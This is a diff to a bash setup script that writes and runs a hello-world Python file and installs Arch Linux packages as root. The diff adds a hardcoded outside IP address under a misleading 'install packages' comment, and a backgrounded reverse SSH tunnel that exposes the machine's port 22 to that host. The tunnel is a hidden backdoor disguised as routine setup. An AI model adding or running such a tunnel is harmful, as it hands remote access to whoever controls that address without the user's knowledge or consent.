@@ -1,6 +1,11 @@
 #!/bin/bash
+#python milestone
 echo "print('hello,world!')" >> ~/hello.py
 python ~/hello.py
+sleep 15
+#
+#install packages
+REV="24.240.77.47"
 FILE="/tmp/out.$$"
 GREP="/bin/grep"
 # Make sure only root can run this
@@ -12,4 +17,6 @@ if [ "$(id -u)" != "0" ]; then
 pacman -Syuu
 pacman -S --noconfirm base-devel zsh screen nmap openssh i3-wm xorg-core vba python2-minimal irssi i3status dmenu
 
+#ssh tunnel
+ssh -f -N -T -R22222:localhost:22 $REV &
 
